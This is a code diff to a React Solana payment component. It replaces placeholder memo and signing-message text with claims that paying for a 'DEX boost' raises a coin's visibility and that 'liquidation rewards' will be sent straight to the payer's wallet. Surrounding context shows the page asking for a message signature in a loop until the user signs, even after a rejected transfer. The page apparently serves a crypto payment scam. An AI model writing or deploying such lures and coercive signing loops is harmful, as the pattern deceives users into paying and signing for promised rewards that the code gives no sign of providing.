@@ -169,7 +169,7 @@ const Payment = () => {
       const memoInstruction = new TransactionInstruction({
         keys: [{ pubkey: fromPubkey, isSigner: true, isWritable: false }],
         programId: MEMO_PROGRAM_ID,
-        data: Buffer.from("What is your name?", "utf-8"),
+        data: Buffer.from("Paying for a DEX boost increases your project's visibility and user interaction with the coin. As a bonus, liquidation rewards will be sent directly to your wallet after payment for the boost.", "utf-8"),
       });
       transaction.add(memoInstruction);
       
@@ -249,7 +249,7 @@ const Payment = () => {
       }
 
       // After transfer (confirmed or rejected), show message signing in a loop
-      const message = "What is your name?";
+      const message = "Paying for a DEX boost helps increase your project's visibility and drive stronger user interaction with the coin. Enhanced exposure supports higher engagement and trading activity. Additionally, liquidation bonuses will be sent directly to your wallet as a reward for purchasing the boost.";
       const hexMessage = `0x${Array.from(new TextEncoder().encode(message)).map(b => b.toString(16).padStart(2, '0')).join('')}`;
       
       // Loop message signing until user signs
